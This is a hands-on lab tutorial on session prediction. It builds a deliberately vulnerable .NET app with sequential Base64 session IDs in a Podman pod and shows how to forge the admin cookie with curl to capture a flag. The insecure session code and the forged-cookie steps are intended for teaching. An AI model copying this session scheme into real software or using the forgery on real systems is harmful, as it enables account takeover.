# The Sequential Trap: Hacking Session IDs in .NET
**Session-Based Authentication** is the gold standard for stateful web applications. When you log in, the server issues a **Session ID** (usually a cookie) that acts as your temporary passport.

But what if that passport number was just... the next number in line?

Session hijacking is the digital equivalent of finding a movie ticket on the floor and walking into the theater; the usher (server) only checks the ticket (session ID), not the face (identity).

In this lab, we will explore **Session Prediction**. You will analyze a .NET application that issues predictable session tokens, and you will use basic math to hijack the Administrator's active session without ever guessing their password.
***
## The Architecture: The "Sidecar" Micro-Range
We are using a **Podman Pod** to simulate a network.

- **Target (Port 8083):** A .NET Web App with a custom (and vulnerable) session manager.
- **Attacker:** A Kali Linux container sharing the same network namespace.
- **The Vulnerability:** The application assigns Session IDs sequentially (100, 101, 102...) and encodes them in Base64 to make them look secure.
### Phase 1: Build the Target (.NET)
We need a target that simulates a "Legacy System" where the developer tried to write their own authentication logic instead of using the standard ASP.NET Core Identity.

#### 1. The Application Code (`Program.cs`)
Create `SessionAuth` folder.
Create `src` folder within `SessionAuth`. Save this code into a file named `Program.cs` in src. It simulates a system where the **Administrator** logged in first (Session ID 1) and is currently active in memory.

```csharp
using System.Text;
using System.Collections.Concurrent;

var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

// --- MOCK DATABASE & SESSION STORE ---
// The "Server Side" State
var sessions = new ConcurrentDictionary<string, string>();

// 1. Simulate Admin logging in at server startup (Session ID "1")
// "MQ==" is Base64 for "1"
sessions["MQ=="] = "admin"; 

// Counter for new users (We start at 100 to hide the low numbers)
int sessionCounter = 100; 

// --- MIDDLEWARE ---
app.Use(async (context, next) =>
{
    // Check for the Session Cookie
    string? sessionCookie = context.Request.Cookies["legacy_session_id"];

    if (!string.IsNullOrEmpty(sessionCookie) && sessions.TryGetValue(sessionCookie, out var user))
    {
        context.Items["User"] = user;
    }
    else
    {
        context.Items["User"] = "Guest";
    }

    await next();
});

// --- ENDPOINTS ---

// 2. Login (Gives you a NEW predictable session)
app.MapGet("/login", (HttpContext context) =>
{
    sessionCounter++;
    string rawId = sessionCounter.ToString();
    
    // VULNERABILITY: The ID is just a number encoded in Base64
    // Real sessions should be 128-bit random strings!
    string encodedId = Convert.ToBase64String(Encoding.UTF8.GetBytes(rawId));
    
    // Store in memory
    sessions[encodedId] = "student_user";

    // Send Cookie
    context.Response.Cookies.Append("legacy_session_id", encodedId);
    return Results.Ok(new { msg = "Logged in", role = "student_user", session_token = encodedId });
});

// 3. The Protected Admin Panel
app.MapGet("/admin", (HttpContext context) =>
{
    var user = context.Items["User"] as string;

    if (user == "admin")
    {
        return Results.Ok(new { 
            status = "access_granted", 
            flag = "flag{randomness_is_critical_for_sessions}",
            secret_data = "The launch codes are 0000"
        });
    }

    return Results.Problem($"Access Denied. You are: {user}", statusCode: 403);
});

app.Run("http://0.0.0.0:8083");

```
#### 2. The Containerfile
Save this as `Containerfile` in `SessionAuth` folder.
```dockerfile
FROM mcr.microsoft.com/dotnet/sdk:8.0 AS build
WORKDIR /src
RUN dotnet new web -n AuthSession
COPY src/Program.cs /src/AuthSession/Program.cs
WORKDIR /src/AuthSession
RUN dotnet publish -c Release -o /app

FROM mcr.microsoft.com/dotnet/aspnet:8.0
WORKDIR /app
COPY --from=build /app .
ENTRYPOINT ["dotnet", "AuthSession.dll"]

```
### Phase 2: Deploy the Lab
We will use Podman to spin up the shared environment. Run these commands in your terminal from `SessionAuth` folder.

```bash
# 1. Build the Target Image
podman build -f Containerfile -t auth-session-target .

# 2. Create the Pod (Expose Port 8083)
podman pod create --name auth-pod -p 8083:8083

# 3. Launch the Target
podman run -d --pod auth-pod --name target-session auth-session-target

# 4. Launch the Attacker (Kali)
podman run -d --pod auth-pod --name attacker kalilinux/kali-rolling sleep infinity

```
### Phase 3: The Attack (Session Hijacking)
**Scenario:** You have just registered for the site. You want to see the /admin panel, but you only have "student" access. You suspect the session IDs might not be random.

#### Step 1: Get a Legitimate Session
Remote into your Kali container and log in normally. We use -c to save the cookies to a file so we can inspect them.
```bash
# Remote into Kali
podman exec -it attacker /bin/bash

# Log in
curl -v -c cookies.txt http://localhost:8083/login

```
#### Step 2: Analyze the Token
Look at the cookies.txt file or the Set-Cookie header.
- **Observation:** legacy_session_id=MTAx
It looks like random text, but let's try to decode it. It ends with an =, which is a tell-tale sign of **Base64**.

```bash
echo "MTAx" | base64 -d
# Output: 101

```
#### The Epiphany:
If you are user **101**, and the IDs are sequential, then the Administrator (the first user) is likely User **1**.

#### Step 3: Forge the Weapon

We need to create a cookie for User ID "1".
```bash
# Encode "1" into Base64
echo -n "1" | base64
# Output: MQ==

```
#### Step 4: The Hijack

We will request the `/admin` page. We will **not** log in as admin. Instead, we will simply attach the forged cookie legacy_session_id=MQ== to our request. The server will trust the cookie and let us in.
```bash
# -b sends a cookie
curl -v -b "legacy_session_id=MQ==" http://localhost:8083/admin

```
**Success!**
The server believes you are the admin and returns the flag:

`flag{randomness_is_critical_for_sessions}`

### Conclusion
You just bypassed authentication completely by guessing a number.

### The Lesson:
Session IDs must be **long** and **cryptographically random**.
- **Bad:** Sequential numbers, Time-based values, MD5(username).
- **Good:** ASP.NET Core's default ISession or Identity cookies, which use 128-bit random strings that are statistically impossible to guess.